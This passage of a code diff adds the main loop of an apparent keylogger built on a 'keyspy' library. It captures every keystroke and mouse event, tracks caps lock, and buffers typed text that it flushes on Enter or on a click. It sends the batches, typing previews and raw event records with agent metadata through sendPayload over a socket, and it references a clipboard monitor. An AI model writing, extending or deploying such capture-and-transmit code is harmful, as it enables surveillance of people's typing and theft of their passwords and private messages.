+    mac: { onError: (c) => console.error(`[keyspy ${c}]`), onInfo: (i) => console.error(`[keyspy] ${i}`) },
+    x11: { onError: (c) => console.error(`[keyspy ${c}]`), onInfo: (i) => console.error(`[keyspy] ${i}`) },
+  });
+
+  await keyboard.addListener((event, isDown) => {
+    const keyName = event.name ?? "UNKNOWN";
+
+    if (event.state === "DOWN") {
+      if (isLeftMouseDownKey(keyName, event.state)) {
+        const batch = textBuffer.flush("mouse", agentMeta);
+        if (batch) {
+          sendPayload(batch);
+        }
+        sendPayload(typingPreviewPayload(textBuffer, agentMeta));
+      } else if (isEnterKey(keyName)) {
+        const batch = textBuffer.flush("enter", agentMeta);
+        if (batch) {
+          sendPayload(batch);
+        }
+        sendPayload(typingPreviewPayload(textBuffer, agentMeta));
+      }
+    }
+
+    const record = buildEventRecord(event, isDown, { ...options, typingState });
+
+    if (record?.state === "DOWN") {
+      if (record.type === "keyboard" && (record.key === "CAPS LOCK" || record.key === "CAPSLOCK")) {
+        typingState.toggleCapsLock();
+      }
+      if (record.type === "keyboard" && !isEnterKey(record.key)) {
+        const changed = textBuffer.appendFromKey(record, isDown);
+        if (changed) {
+          sendPayload(typingPreviewPayload(textBuffer, agentMeta));
+        }
+      }
+    }
+
+    if (record && (record.type === "keyboard" || record.type === "mouse")) {
+      sendPayload(record);
+    }
+    return false;
+  });
+
+  console.log("Capturing keyboard + mouse. Ctrl+C to stop.");
+
+  const shutdown = () => {
+    shouldRun = false;
+    clipboardMonitor.stop();
+    const tail = textBuffer.flush("enter", agentMeta);
+    if (tail) sendPayload(tail);
+    keyboard.kill();
+    disconnectSocket();
+    if (logStream) logStream.end();
+    process.exit(0);
+  };
+  process.on("SIGINT", shutdown);
+  process.on("SIGTERM", shutdown);
+}
+
+main().catch((err) => {
+  console.error(err.message);
+  process.exit(1);
+});
